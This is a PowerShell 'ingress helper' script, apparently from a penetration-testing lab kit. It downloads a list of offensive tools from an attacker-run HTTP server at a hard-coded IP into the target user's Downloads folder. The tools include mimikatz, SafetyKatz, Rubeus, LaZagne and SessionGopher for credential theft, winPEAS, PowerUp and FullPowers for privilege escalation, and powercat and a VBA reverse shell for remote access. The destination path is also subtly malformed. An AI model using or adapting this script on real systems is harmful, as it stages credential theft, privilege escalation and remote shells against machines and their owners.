#this file is intended to move files in a bulk fashion as an ingress helper
$myIP = "10.10.14.189"
#change your IP
$destinationFolder = "C:\Users\$env:USERPROFILE\Downloads"
#change your destinationFolder if you wish
$files = @(
    "powercat.ps1",
    "pmap.ps1",
    "PsMapExec.ps1",
    "pmap.psd1",
    "pmap.psm1",
    "reverse_shell.vba",
    "config.Library-ms",
    "mimikatz.exe",
    "FullPowers.exe",
    "Rubeus.exe",
    "SafetyKatz.exe",
    "Seatbelt.exe",
    "winPEASany.exe",
    "PowerUp.ps1",
    "jaws-enum.ps1",
    "SessionGopher.ps1",
    "LaZagne.exe"
)
foreach ($file in $files) {
    $sourceUrl = "http://$myIP/$file"
    $destinationPath = Join-Path -Path $destinationFolder -ChildPath $file
   
    Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath

    if (Test-Path $destinationPath) {
        Write-Host "Successfully downloaded $file to $destinationPath"
    } else {
        Write-Host "Failed to download $file"
    }
}
Write-Host "Your files should be in your users download folder"
